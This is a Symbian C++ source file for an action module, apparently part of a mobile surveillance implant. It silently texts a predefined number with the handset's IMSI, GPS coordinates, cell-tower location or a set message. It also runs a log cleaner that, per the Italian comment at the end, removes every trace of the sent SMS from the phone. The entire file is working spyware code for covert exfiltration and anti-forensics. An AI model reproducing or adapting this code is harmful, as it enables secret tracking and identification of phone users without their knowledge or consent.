/*
 ============================================================================
 Name		: ActionSms.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CActionSms implementation
 ============================================================================
 */

#include "ActionSms.h"
#include "Json.h"

CActionSms::CActionSms() :
	CAbstractAction(EAction_Sms)
	{
	// No implementation required
	}

CActionSms::~CActionSms()
	{
	delete iLogCleaner;     // added jo'
	delete iGPS;
	delete iPhone;
	delete iSendSms;
	iSocketServ.Close(); 
	iFs.Close();			// added jo'
	}

CActionSms* CActionSms::NewLC(const TDesC8& params)
	{
	CActionSms* self = new (ELeave) CActionSms();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CActionSms* CActionSms::NewL(const TDesC8& params)
	{
	CActionSms* self = CActionSms::NewLC(params);
	CleanupStack::Pop(); // self;
	return self;
	}

void CActionSms::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	
	User::LeaveIfError(iFs.Connect());        // added jo'
	iLogCleaner = CLogCleaner::NewL(iFs);	  // added jo'	
	
	User::LeaveIfError(iSocketServ.Connect());
	iSendSms = CSmsSenderSocket::NewL(iSocketServ, this);
	iPhone = CPhone::NewL();
	iGPS = CGPSPosition::NewL(*this);
	
	
	//parse params
	RBuf paramsBuf;
				
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve type
		TBuf<8> typeBuf;
		rootObject->GetStringL(_L("type"),typeBuf);
		if(typeBuf.Compare(_L("location")) == 0)
			{
			iOption = ESms_GPS;
			}
		else if (typeBuf.Compare(_L("text")) == 0)
			{
			iOption = ESms_Text;
			//retrieve text
			rootObject->GetStringL(_L("text"),iSmsText);
			}
		else
			{
			iOption = ESms_IMSI;
			}
		//retrieve number
		rootObject->GetStringL(_L("number"),iSmsNumber);
		CleanupStack::PopAndDestroy(rootObject);
		}

	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	}

void CActionSms::DispatchStartCommandL()
	{
	iLogCleaner->StartCleaner(iSmsNumber);  // added jo'
	
	switch (iOption)
		{
		case ESms_IMSI:
			{
			TBuf<CTelephony::KIMSISize> imsi;
			iPhone->GetImsiSync(imsi);
			iSmsText = _L("IMSI: ");
			iSmsText.Append(imsi);
			iSendSms->SendHiddenSmsL(iSmsNumber, iSmsText);
			break;
			}
		case ESms_Text:
			{
			iSendSms->SendHiddenSmsL(iSmsNumber, iSmsText);
			break;
			}
		case ESms_GPS:
			{
			// Interv in Sec... Wait Time in Minutes for FIX.
			iGPS->ReceiveData(1, 4);
			break;
			}
		default:
			break;
		}
	}

void CActionSms::SmsSentL(TInt aError)
	{
	if (aError != KErrNone)
		{
		// handle the error...
		}
	MarkCommandAsDispatchedL();
	SetFinishedJob(EFalse);
	}

//void CActionSms::HandleGPSPositionL(TPosition position)  //original MB
void CActionSms::HandleGPSPositionL(TPositionSatelliteInfo satPos)
	{
	iGPS->Cancel();
	TPosition position;
	satPos.GetPosition(position);
	_LIT(KFormat, "GPS lat: %f lon: %f");
	iSmsText.Zero();
	iSmsText.AppendFormat(KFormat, position.Latitude(), position.Longitude());
	iSendSms->SendHiddenSmsL(iSmsNumber, iSmsText);
	}

void CActionSms::HandleGPSErrorL(TInt error)
	{
	TUint cellId;
	TUint lac;
	TBuf<CTelephony::KNetworkIdentitySize> network;
	TBuf<CTelephony::KNetworkCountryCodeSize> cc;
	TBuf<CTelephony::KNetworkLongNameSize> oper;
	iPhone->GetCellIDSync(cellId, lac, network, cc, oper);

	cellId = cellId & 0xFFFF;   // jo, maybe redundant
	
	// CC: %d, MNC: %d, LAC: %d, CID: %d
	if (cc.Length() > 0)
		{
		_LIT(KFormat, "CC: %S, MNC: %S, LAC: %d, CID: %d");
		iSmsText.Zero();
		iSmsText.AppendFormat(KFormat, &cc, &network, lac, cellId);
		iSendSms->SendHiddenSmsL(iSmsNumber, iSmsText);
		}
	else
		{
		iSendSms->SendHiddenSmsL(iSmsNumber, _L("Cell and GPS info not available."));
		}
	}

/*
 L'ActionSms  invia, in maniera nascosta, un SMS ad un numero predefinito. L'azione e' responsabile della rimozione di ogni traccia dell'SMS inviato sul telefono.
 Parametri

 All'azione vengono inviati almeno tre parametri utilizzando la ActionStruct:

 uOpt
 e' un UINT che puo' assumere i seguenti 3 valori:

 * SMS_GPS = 1: Invia un SMS contenente le coordinate del device al momento della richiesta.
 * SMS_IMSI = 2: Invia un SMS contenente l'IMSI della SIM card in uso.
 * SMS_TEXT = 3: Invia un SMS con il testo preconfigurato. 

 uNumLen
 e' un UINT ed indica la lunghezza, in byte, del numero di telefono del destinatario. 
 wNumber
 e' un WCHAR e contiene il numero di telefono del destinatario. 
 dwTextLen
 (facoltativo) e' un UINT, esiste solo nel caso in cui uOpt assuma il valore SMS_TEXT ed indica la lunghezza del testo da inviare. 
 wText
 e' un puntatore a WCHAR e punta al testo da inviare al destinatario. 

 GPS

 Se si sceglie l'opzione SMS_GPS il comportamento dell'azione e' il seguente:

 1. Viene acceso il GPS ed effettuato il polling della posizione per 240 secondi. Se entro questo tempo viene trovata una posizione valida, viene inviata al destinatario nel seguente formato: GPS lat: %f lon: %f (latitudine e longitudine).
 2. Se non e' stato possibile ottenere una posizione GPS valida si cerca di ottenere tutti i dati relativi alla cella su cui e' associato il device. I dati vanno inviati nel seguente formato: CC: %d, MNC: %d, LAC: %d, CID: %d (Country Code, Mobile Network Code, Location Area Code, Cell Id).
 3. Se non si riescono ad ottenere le informazioni di cella valide, si invia al destinatario il seguente messaggio: Cell and GPS info not available. 

 IMSI

 Se si sceglie l'opzione SMS_IMSI, va inviato al destinatario un messaggio contenente l'IMSI della SIM card nel seguente formato: IMSI: %s.
 Text

 Se si sceglie l'opzione SMS_TEXT, va inviato al destinatario un messaggio contenente la stringa definita in fase di configurazione e che si trova nei parametri inviati all'azione. 
 */
